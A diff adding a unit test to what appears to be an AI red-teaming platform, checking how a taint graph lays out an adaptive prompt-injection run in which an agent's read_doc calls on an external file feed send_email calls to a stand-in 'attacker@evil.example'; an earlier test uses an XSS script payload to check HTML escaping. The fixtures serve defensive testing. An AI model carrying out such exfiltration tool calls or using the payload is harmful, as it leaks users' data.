@@ -15,6 +15,7 @@ from fastapi.testclient import TestClient
 
 import platform_api.app as api
 import platform_api.history as history
+import platform_api.reports as reports
 
 
 @pytest.fixture()
@@ -157,3 +158,43 @@ def test_export_html_escapes_attacker_payload() -> None:
     page = api.export.to_html(detail)
     assert "<script>alert(1)</script>" not in page
     assert "&lt;script&gt;alert(1)&lt;/script&gt;" in page
+
+
+def test_taint_graph_splits_source_and_sink_columns() -> None:
+    """自适应轨迹是累积的：同一 call_id 会在后续每轮重复出现。
+
+    图必须一点一次、并把被当作 sink 用过的调用移到最后一列——否则 12 个调用挤在源列，
+    前端只能缩到看不清，污点传播图就失去意义了。
+    """
+    trajectory = []
+    for rnd in (1, 2, 3):
+        calls = []
+        for r in range(1, rnd + 1):
+            calls.append({"tool": "read_doc", "call_id": f"src-{r}", "args": {"path": "external.txt"}})
+            calls.append({"tool": "send_email", "call_id": f"sink-{r}", "args": {"to": "attacker@evil.example"}})
+        trajectory.append({"round": rnd, "payload": "p", "target_response": "r", "tool_calls": calls})
+    report = {
+        "trajectory": trajectory,
+        "taint_edges": [
+            {
+                "source_call_id": "src-1",
+                "sink_call_id": "sink-2",
+                "source_tool": "read_doc",
+                "sink_tool": "send_email",
+                "sink_field": "body",
+                "layer": "substring",
+                "blocked": True,
+                "matched_snippet": "客户名称",
+            }
+        ],
+    }
+    graph = reports.taint_graph(report, {"target": {"id": "T1", "name": "客服"}})
+
+    by_id = {n["id"]: n for n in graph["nodes"]}
+    assert by_id["src-1"]["column"] == 2
+    assert by_id["sink-2"]["column"] == 3, "sink 调用留在源列，图就画成一捆横线"
+    assert by_id["sink-2"]["kind"] == "sink"
+    call_edges = {e["id"]: e for e in graph["edges"] if e["state"] == "call"}
+    assert len(call_edges) == 6, "累积轨迹不能重复建边"
+    assert all(e["hits"] == 1 for e in call_edges.values()), "round 1 不该显示 ×3"
+    assert len({e["id"] for e in graph["edges"]}) == len(graph["edges"])
